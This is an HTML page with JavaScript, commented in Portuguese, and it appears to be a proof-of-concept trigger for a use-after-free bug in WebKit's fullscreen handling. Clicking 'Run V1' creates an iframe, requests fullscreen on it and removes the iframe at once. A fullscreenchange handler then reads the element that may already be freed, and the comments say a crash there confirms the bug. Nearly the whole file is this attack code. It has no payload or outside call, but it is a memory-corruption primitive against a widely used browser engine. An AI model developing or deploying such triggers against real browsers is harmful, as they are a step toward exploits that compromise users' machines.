<html>
<body>
<button id="run">Run V1</button>
<div id="status">Ready</div>
<script>
/*
  VETOR: FullscreenManager::m_fullscreenElement raw/weak ptr
  Remove o iframe imediatamente após webkitRequestFullscreen(),
  antes da transição completar — tenta causar UAF no callback
  de fullscreenchange quando o manager tenta acessar o elemento.
*/

document.addEventListener('webkitfullscreenchange', function() {
    var el = document.webkitFullscreenElement;
    document.getElementById("status").innerHTML =
        "fullscreenchange: element=" + (el ? el.tagName : "null");
    if (el) {
        try {
            // Acesso após possível free — crash aqui = UAF confirmado
            var w = el.clientWidth;
            var h = el.clientHeight;
            document.getElementById("status").innerHTML +=
                " w=" + w + " h=" + h;
        } catch(e) {
            document.getElementById("status").innerHTML += " EX:" + e;
        }
    }
});

document.getElementById("run").onclick = function() {
    var iframe = document.createElement("iframe");
    iframe.width = 200;
    iframe.height = 200;
    document.body.appendChild(iframe);

    iframe.onload = function() {
        var doc = iframe.contentDocument;
        doc.open();
        doc.write('<html><body><div id="t" style="width:100%;height:100%;background:blue"></div></body></html>');
        doc.close();

        var el = doc.documentElement;
        el.webkitRequestFullscreen();

        // Remove IMEDIATAMENTE — sem setTimeout
        // FullscreenManager ainda está processando a requisição
        iframe.remove();

        document.getElementById("status").innerHTML = "iframe removed sync";
    };
};
</script>
</body>
</html>
